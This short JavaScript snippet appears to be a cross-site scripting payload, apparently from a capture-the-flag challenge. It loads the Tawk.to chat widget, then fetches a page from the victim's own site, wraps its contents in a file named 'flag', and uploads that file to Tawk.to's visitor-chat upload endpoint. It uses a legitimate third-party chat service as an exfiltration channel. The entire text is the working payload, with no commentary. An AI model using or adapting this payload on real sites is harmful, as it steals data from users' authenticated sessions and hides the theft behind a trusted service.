var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/61830caa6bb0760a494106d7/1fjjuiusl';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);

})();

fetch("/view/f1135719-d3a5-4534-9bc1-f7ddcf4c8cb3").then((res) => {
    return res.text();
  }).then(data => {
			var formData = new FormData();
			var file = new File([data], "flag", {
			type: "text/plain",
		});

    formData.append("upload", file);

    fetch("https://upload.tawk.to/upload/visitor-chat/visitor?handle=f93538fe35475cb4af05ead873c67e2d421d9532&visitorSessionId=61857978ce40c32e3edff8f5",{
        method: 'POST',
        body: formData
    });

})
